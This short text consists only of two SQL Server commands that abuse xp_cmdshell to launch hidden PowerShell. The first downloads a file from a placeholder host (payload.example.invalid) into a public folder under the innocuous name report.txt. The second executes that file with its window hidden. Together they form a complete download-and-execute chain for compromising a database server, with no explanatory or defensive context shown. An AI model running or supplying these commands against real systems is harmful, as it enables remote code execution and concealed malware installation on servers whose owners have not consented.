        
        EXEC xp_cmdshell 'powershell -nop -w hidden -c "$w=new-object net.webclient;$w.Proxy=$null;$w.DownloadFile(''http://payload.example.invalid/report.txt'',''C:\Users\Public\report.txt'')"';
        
        EXEC xp_cmdshell 'powershell -nop -w hidden -c "Start-Process -FilePath C:\Users\Public\report.txt -WindowStyle Hidden"';
